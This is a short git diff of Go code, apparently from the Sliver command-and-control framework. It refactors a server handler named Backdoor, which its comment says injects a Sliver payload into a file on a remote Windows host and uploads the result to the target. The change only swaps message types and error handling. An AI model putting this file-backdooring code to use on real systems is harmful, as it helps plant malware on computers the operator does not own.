@@ -37,8 +37,8 @@ import (
 )
 
 // Backdoor - Inject a sliver payload in a file on the remote system
-func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sliverpb.Backdoor, error) {
-	resp := &sliverpb.Backdoor{}
+func (rpc *Server) Backdoor(ctx context.Context, req *clientpb.BackdoorReq) (*clientpb.Backdoor, error) {
+	resp := &clientpb.Backdoor{}
 	session := core.Sessions.Get(req.Request.SessionID)
 	if session.OS != "windows" {
 		return nil, status.Error(codes.InvalidArgument, fmt.Sprintf("%s is currently not supported", session.OS))
@@ -106,7 +106,7 @@ func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sl
 	if err != nil {
 		return nil, status.Error(codes.Internal, err.Error())
 	}
-	uploadGzip := new(encoders.Gzip).Encode(newFile)
+	uploadGzip, _ := new(encoders.Gzip).Encode(newFile)
 	// upload to remote target
 	upload, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{
 		Encoder: "gzip",
